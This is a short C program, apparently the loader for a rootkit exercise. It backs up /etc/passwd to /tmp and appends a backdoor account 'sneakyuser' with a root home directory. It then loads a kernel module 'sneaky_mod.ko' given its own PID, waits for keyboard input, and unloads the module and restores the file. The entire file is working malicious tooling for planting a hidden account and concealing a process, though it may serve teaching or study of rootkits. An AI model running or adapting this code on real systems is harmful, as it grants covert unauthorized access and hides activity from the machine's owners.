#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>


int main(){
  int pid = getpid();
  printf("sneaky_process pid = %d\n", pid);
  
  system("cp -p /etc/passwd /tmp/");
  system("echo sneakyuser:abc123:2000:2000:sneakyuser:/root:bash >> /etc/passwd");

  char buf[128];
  int n;
  n = sprintf(buf,"insmod sneaky_mod.ko pid=%d",pid);
  system(buf);
  
  int c;
  do {
    c = getchar();
  }while(c!= 'q');
  
  system("rmmod sneaky_mod");

  system("cp -p /tmp/passwd /etc/passwd");

  return 0;
}
